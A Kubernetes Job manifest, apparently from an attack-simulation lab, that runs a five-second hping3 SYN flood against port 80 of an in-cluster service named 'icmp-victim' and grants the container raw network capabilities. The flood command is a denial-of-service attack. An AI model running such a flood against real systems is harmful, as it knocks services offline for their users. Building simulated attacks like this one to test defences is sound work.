# Thanks to https://hub.docker.com/u/olegvorobyov90
apiVersion: batch/v1
kind: Job
metadata:
  name: syn-flood-job
  namespace: darkforce
  labels:
    app: syn-flood
spec:
  template:
    metadata:
      labels:
        app: syn-flood
    spec:
      containers:
      - name: syn-flood-attack
        image: evantage/attack-leap15:0.1
        command: ["/bin/bash", "-c", "timeout 5 hping3 --syn --flood -p 80 icmp-victim-0.icmp-victim.avalon.svc.cluster.local || true"]
        securityContext:
          capabilities:
            add:
              - NET_ADMIN
              - NET_RAW
      restartPolicy: Never
  backoffLimit: 0